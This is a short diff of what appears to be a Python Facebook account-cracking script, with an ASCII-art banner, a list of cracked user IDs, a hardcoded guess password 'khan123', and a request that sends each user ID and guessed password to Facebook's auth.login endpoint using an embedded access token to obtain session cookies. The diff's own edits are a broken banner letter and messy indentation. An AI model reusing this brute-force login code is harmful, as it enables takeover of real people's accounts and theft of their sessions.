@@ -79,7 +79,7 @@ logo = """
                      88   8D 88.     db   8D    88    
                      Y8888P' Y88888P `8888Y'    YP    
                                   
-                       EVERYTHING IS POSSIBLE TO ME            
+                      VERYTHING IS POSSIBLE TO ME            
 
                              
                                                                                                                                            
@@ -782,7 +782,8 @@ def menu_select():
 
 		                                                            oks.append(uid)
           
-                                                            else:
+                                                                  else:
+			
                                                             	pass8="khan123"
 
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
